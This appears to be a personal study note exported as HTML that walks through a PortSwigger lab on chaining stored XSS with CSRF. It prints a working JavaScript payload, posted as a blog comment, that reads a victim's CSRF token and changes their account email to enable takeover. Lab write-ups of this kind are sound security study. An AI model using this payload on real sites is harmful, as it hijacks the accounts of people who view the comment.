<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>perform CSRF with XSS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>perform CSRF with XSS</h1><br/><br />With an XSS we can trigger also a CSRF!<br /><br /><span style="color:#a52a2a;">Example of how perform a CSRF by using a XSS</span><br />Some websites allow logged-in users to change their email address without re-entering their password. If you&#39;ve found an XSS vulnerability, you can make it trigger this functionality to change the victim&#39;s email address to one that you control, and then trigger a password reset to gain access to the account.<br /><br />1. Log in using the credentials provided. On your user account page, notice the function for updating your email address.<br />2. If you view the source for the page, you&#39;ll see the following information:<br />   ◇ You need to issue a POST request to <code>/my-account/change-email</code>, with a parameter called <code>email</code>.<br />   ◇ There&#39;s an anti-CSRF token in a hidden input called <code>token</code>.<br />   <a href=""><img src="images/1921-1.png" alt="images/1921-1.png" /></a><br />   this is instead the POST request to change the email, we can see that the csrf token is sent to change the email:<br />    <a href=""><img src="images/1921-2.png" alt="images/1921-2.png" /></a><br />3. The exploit will need to:<br />   1)  load the user account page (/my-account)<br />   2)  extract the CSRF token (with function “responseText.match(...)”)<br />   3)  and then use the token to change the victim&#39;s email address  (with function “XMLHttpRequest().send(...)”)<br /> Submit the following payload in a blog comment:<br /><div class="codebox"><pre>&lt;script&gt;<br /><span style="color:#ff9d00;font-weight:700">var</span> req = <span style="color:#ff9d00;font-weight:700">new</span> XMLHttpRequest();<br />req.onload = handleResponse;<br />req.open(<span style="color:#3ad900;font-weight:400">&#39;get&#39;</span>,<span style="color:#3ad900;font-weight:400">&#39;/my-account&#39;</span>,<span style="color:#ff0044;font-weight:400">true</span>);<br />req.send();<br /><span style="color:#ff9d00;font-weight:700">function</span> handleResponse() {<br />    <span style="color:#ff9d00;font-weight:700">var</span> token = <span style="color:#ff9d00;font-weight:700">this</span>.responseText.<span style="color:#ff9d00;font-weight:700">match</span>(<span style="color:#3ad900;font-weight:400">/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/</span>)[<span style="color:#ff0044;font-weight:400">1</span>];<br />    <span style="color:#ff9d00;font-weight:700">var</span> changeReq = <span style="color:#ff9d00;font-weight:700">new</span> XMLHttpRequest();<br />    changeReq.open(<span style="color:#3ad900;font-weight:400">&#39;post&#39;</span>, <span style="color:#3ad900;font-weight:400">&#39;/my-account/change-email&#39;</span>, <span style="color:#ff0044;font-weight:400">true</span>);<br />    changeReq.send(<span style="color:#3ad900;font-weight:400">&#39;csrf=&#39;</span>+token+<span style="color:#3ad900;font-weight:400">&#39;&amp;email=test@test.com&#39;</span>)<br />};<br />&lt;/script&gt;</pre></div><br /><br />    <a href=""><img src="images/1921-3.png" alt="images/1921-3.png" /></a><br /><br />This will make anyone who views the comment issue a POST request to change their email address to <code>test@test.com</code>.<br /><br />                         <br /><strong>Bibliography:</strong><br /><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf">https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf</a></div>
</body>
</html>
